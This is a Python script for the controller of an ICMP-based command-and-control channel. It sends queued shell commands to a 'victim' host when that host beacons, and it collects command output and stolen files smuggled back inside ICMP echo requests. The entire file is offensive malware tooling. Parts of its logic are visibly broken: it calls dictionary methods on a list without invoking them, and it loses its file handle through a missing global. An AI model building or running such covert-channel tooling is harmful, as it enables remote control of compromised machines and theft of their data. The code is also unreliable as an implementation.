
from icmp_c2_modules import *

commands_que = {}
opened_fd = ""

def commands_input():
    global commands_que
    while True:
        if not commands_que:
            commands_que = input("\nEnter type and command (ex: run ls):\n").split ()
            print(commands_que)

def check_type(packet):
    return packet[0][ICMP].id

def send_command(ip_adr):
    global commands_que
    if not commands_que:
        return
    id_type = commands_que.keys
    coomand_name = commands_que.values
    if id_type == "run":
        id_type = RUN
    elif id_type == "send":
        id_type = FILE
    pkt_send(dest=ip_adr,data=commands_que,icmp_type="echo-request",id_packet=id_type)
    commands_que = ""
        
    
def parse_packet(packet):
    if Raw in packet:
        victim_ip = packet[IP].src
        type_packet = check_type(packet)
        data_recieved = extract_data(packet)
        if type_packet == BEACON:
            send_command(victim_ip)                 # check if there is a command in the queue and send if there is
      
        elif type_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
            opened_fd = open_file(LOG_OUTPUT)
            write_to_file(opened_fd,data_recieved)  # write only the name of the command the the output commands log
        
        elif type_packet == BEGIN_FILE:             # a packet that tells the server to prepare; name of the file in the data extracted
            opened_fd = open_file(data_recieved)
            
        elif type_packet == IN_TRANSFER:
            write_to_file(opened_fd,data_recieved)  # write the content to the opened fd
            
        elif type_packet == EF:                     # a packet that tells the server that client has finished transferring
            close_file(opened_fd)
            opened_fd = ""
            print("transer complete")
            
                        
def server_listen():
    sniff_pkt(ICMP_REQUEST,parse_packet)
    

signal.signal(signal.SIGINT, signal_handler)

enter_command_thread = threading.Thread(target=commands_input)
enter_command_thread.start()

print("start listening")
server_listen()    # Start sniffing packets





